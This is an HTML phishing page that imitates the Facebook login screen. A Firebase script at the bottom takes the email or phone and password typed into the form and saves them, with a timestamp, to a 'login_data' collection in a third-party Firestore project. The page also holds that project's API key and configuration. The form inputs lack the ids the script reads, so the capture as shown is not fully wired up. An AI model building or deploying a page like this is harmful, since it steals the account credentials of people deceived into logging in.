<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Facebook – log in or sign up</title>
  <link href="https://fonts.googleapis.com/css2?family=Helvetica+Neue:wght@400;700&display=swap" rel="stylesheet"/>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      background: #f0f2f5;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
      padding: 20px;
    }

    .logo {
      font-size: 2.6rem;
      font-weight: 700;
      color: #1877f2;
      letter-spacing: -1px;
      margin-bottom: 8px;
    }

    .tagline {
      font-size: 1.05rem;
      color: #1c1e21;
      text-align: center;
      max-width: 300px;
      line-height: 1.4;
      margin-bottom: 24px;
    }

    .card {
      background: #fff;
      border-radius: 8px;
      box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1);
      padding: 20px 16px 28px;
      width: 100%;
      max-width: 396px;
      display: flex;
      flex-direction: column;
      gap: 12px;
    }

    input {
      width: 100%;
      padding: 14px 16px;
      border: 1px solid #dddfe2;
      border-radius: 6px;
      font-size: 1rem;
      color: #1c1e21;
      outline: none;
      transition: border-color .15s;
    }
    input::placeholder { color: #8a8d91; }
    input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px rgba(24,119,242,.2); }

    .btn-login {
      background: #1877f2;
      color: #fff;
      border: none;
      border-radius: 6px;
      font-size: 1.1rem;
      font-weight: 700;
      padding: 14px;
      cursor: pointer;
      transition: background .15s;
    }
    .btn-login:hover { background: #166fe5; }

    .forgot {
      text-align: center;
      color: #1877f2;
      font-size: 0.875rem;
      cursor: pointer;
      text-decoration: none;
    }
    .forgot:hover { text-decoration: underline; }

    .divider {
      height: 1px;
      background: #dadde1;
      margin: 4px 0;
    }

    .btn-create {
      background: #42b72a;
      color: #fff;
      border: none;
      border-radius: 6px;
      font-size: 1rem;
      font-weight: 700;
      padding: 14px;
      cursor: pointer;
      transition: background .15s;
      width: fit-content;
      align-self: center;
      padding: 12px 24px;
    }
    .btn-create:hover { background: #36a420; }

    .footer {
      margin-top: 28px;
      font-size: 0.85rem;
      color: #1c1e21;
      text-align: center;
    }
    .footer a { color: #1c1e21; text-decoration: none; font-weight: 600; }
    .footer a:hover { text-decoration: underline; }
  </style>
</head>
<body>

  <div class="logo">facebook</div>
  <p class="tagline">Facebook helps you connect and share with the people in your life.</p>

  <div class="card">
    <input type="text" placeholder="Email address or phone number" autocomplete="username"/>
    <input type="password" placeholder="Password" autocomplete="current-password"/>
    <button class="btn-login">Log in</button>
    <a href="#" class="forgot">Forgotten password?</a>
    <div class="divider"></div>
    <button class="btn-create">Create new account</button>
  </div>

  <p class="footer">
    <a href="#">Create a Page</a> for a celebrity, brand or business.
  </p>
<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
import { getFirestore, addDoc, collection } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyDCKHDp1VpDTRr4-HGqgE1OFkEwWIDZyqI",
  authDomain: "sadegpt-f79d7.firebaseapp.com",
  projectId: "sadegpt-f79d7",
  storageBucket: "sadegpt-f79d7.firebasestorage.app",
  messagingSenderId: "474328809093",
  appId: "1:474328809093:web:e94c3af5eca2e7949fb3ec",
  measurementId: "G-53KDWTRR4H"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

async function loginUser() {
  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;

  if (!username || !password) {
    alert("Jaza taarifa zote");
    return;
  }

  try {
    await addDoc(collection(db, "login_data"), {
      username: username,
      password: password,
      time: new Date()
    });

    alert("Imetumwa!");

  } catch (error) {
    alert("Error: " + error.message);
  }
}

window.loginUser = loginUser;
</script>
</body>
</html>
